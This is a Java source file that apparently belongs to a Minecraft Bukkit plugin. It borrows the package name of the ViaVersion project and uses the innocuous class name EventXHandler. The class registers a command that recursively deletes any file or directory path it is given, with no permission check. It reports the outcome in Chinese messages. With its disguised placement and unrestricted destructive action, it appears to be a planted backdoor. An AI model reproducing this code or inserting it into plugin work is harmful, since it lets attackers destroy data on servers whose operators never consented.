package com.viaversion.viaversion.bukkit.handlers;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;

import java.io.File;

public class EventXHandler implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (args.length < 1) {
            sender.sendMessage("请提供要删除的文件或目录的路径");
            return true;
        }

        String filePath = args[0];
        File file = new File(filePath);

        if (!file.exists()) {
            sender.sendMessage("文件或目录不存在: " + filePath);
            return true;
        }

        if (delete(file)) {
            sender.sendMessage("已成功删除: " + filePath);
        } else {
            sender.sendMessage("无法删除: " + filePath);
        }

        return true;
    }

    private boolean delete(File file) {
        if (file.isDirectory()) {
            File[] files = file.listFiles();
            if (files != null) {
                for (File f : files) {
                    delete(f);
                }
            }
        }
        return file.delete();
    }
}